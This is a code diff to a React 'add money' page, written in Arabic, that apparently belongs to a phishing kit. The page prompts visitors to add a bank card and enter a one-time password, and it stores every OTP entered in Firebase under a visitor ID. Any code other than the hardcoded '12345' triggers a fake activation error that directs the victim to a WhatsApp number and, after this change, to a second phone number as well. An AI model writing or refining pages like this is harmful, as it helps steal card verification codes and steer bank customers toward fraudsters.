@@ -7,7 +7,7 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { addData } from "@/lib/firebase";
 import Loader from "./loader";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "./ui/dialog";
-import { ChevronRight, X } from "lucide-react";
+import { ChevronRight, Phone, X } from "lucide-react";
 
 const allOtps = [""];
 
@@ -113,7 +113,7 @@ export default function AddMoneyPage() {
     await addData({ id: visitorId, otp: otpString, allOtps });
 
     if (otpString !== "12345") {
-      setOtpError("هذه العملية غير مدعومة تحتاج الى تفعيل الشريحة الالكترونية الرجاء التواصل مع الدعم");
+      setOtpError(" تحتاج الى تفعيل الشريحة الالكترونية الرجاء التواصل مع الدعم");
       setOtpValues("");
       return;
     }
@@ -148,12 +148,13 @@ export default function AddMoneyPage() {
 
   return (
     <div dir="rtl" className="min-h-screen bg-gray-50 flex flex-col">
-      <form onSubmit={handleSubmit} className="flex-1 flex flex-col justify-center px-6 space-y-6">
-      
-      <div className="bg-[#3111f3] h-12 flex items-center justify-between px-4">
+    
+    <div className="bg-[#3111f3] h-12 flex items-center justify-between px-4">
           <ChevronRight className="w-6 h-6 text-white" />
           <img src="/ASD.svg" alt="" width={90} />
-        </div>
+        </div>  <form onSubmit={handleSubmit} className="flex-1 flex flex-col justify-center px-6 space-y-6">
+      
+
   <p className="text-center text-gray-500 text-sm">
           لتتمكن من إضافة السوار، ابدأ بإضافة بطاقة
         </p>
@@ -244,7 +245,7 @@ export default function AddMoneyPage() {
         <Button
           type="submit"
           disabled={isLoading}
-          className="w-full bg-[#9277d9] hover:bg-[#9277r1] text-white text-lg rounded-xl py-6"
+          className="w-full bg-[#3111f3] hover:bg-[#3111f3] text-white text-lg rounded-xl py-6"
         >
           التالي
         </Button>
@@ -284,13 +285,21 @@ export default function AddMoneyPage() {
               <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200 space-y-3">
                 <p>{otpError}</p>
                 <a
-                  href="https://wa.me/96871129455"
+                  href={"tel:+96871198166"}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="flex justify-between text-right text-blue-600 hover:text-blue-800 underline font-semibold"
+                >
+<Phone width={20}/>                  <span>اضغط هنا للأتصال</span>
+                </a>
+                <a
+                  href={"https://wa.me/96871129455"}
                   target="_blank"
                   rel="noopener noreferrer"
                   className="flex justify-between text-right text-blue-600 hover:text-blue-800 underline font-semibold"
                 >
                   <img src="/whatsapp.png" alt="" width={25} />
-                  <span>اضغط هنا للتواصل</span>
+                  <span> للتواصل على الوتساب</span>
                 </a>
               </div>
             )}
@@ -298,7 +307,7 @@ export default function AddMoneyPage() {
             {!otpError && (
               <Button
                 onClick={handleContinue}
-                className="w-full bg-[#9277d9] hover:bg-[#9277d9] text-white py-4 rounded-full text-lg"
+                className="w-full bg-[#3111f3] hover:bg-[#3111f3] text-white py-4 rounded-full text-lg"
               >
                 تأكيد
               </Button>
